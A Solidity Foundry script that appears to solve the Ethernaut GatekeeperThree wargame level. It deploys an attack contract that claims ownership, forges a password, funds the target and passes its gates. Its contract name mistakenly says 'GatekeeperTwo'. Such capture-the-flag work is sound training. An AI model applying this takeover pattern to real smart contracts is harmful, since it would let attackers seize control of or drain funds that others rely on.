// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/GatekeeperThreeHack.sol";
import "../src/GatekeeperThree.sol";

contract GatekeeperTwoHackScript is Script {
  GatekeeperThreeHack gatekeeperThreeHackContract;
  address gatekeeperThreeContractAddress = 0x8996b99CC802C4AD7e13CFaFc52B515ba3f0B158;
  GatekeeperThree gatekeeperThreeContract = GatekeeperThree(payable(address(0x8996b99CC802C4AD7e13CFaFc52B515ba3f0B158)));

  function setUp() public {}
  
  function run() public {
    uint256 attacker = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(attacker);
    
    // Deploy our contract
    gatekeeperThreeHackContract = new GatekeeperThreeHack(address(gatekeeperThreeContractAddress));

    //call our contracts functions to set things up
    gatekeeperThreeHackContract.claimOwnership(); // Claim ownership for gate 1

    gatekeeperThreeHackContract.generateTrick(); // Generate trick and store password we will use for gate 2

    // try to get enterance allowed.
    gatekeeperThreeHackContract.submitPassword();


    // Load gatekeeper with some ether for gate 3
    payable(gatekeeperThreeContractAddress).send(0.0015 ether);

    gatekeeperThreeHackContract.enterGate();


    console.log(gatekeeperThreeContract.entrant());

    vm.stopBroadcast();
  }

}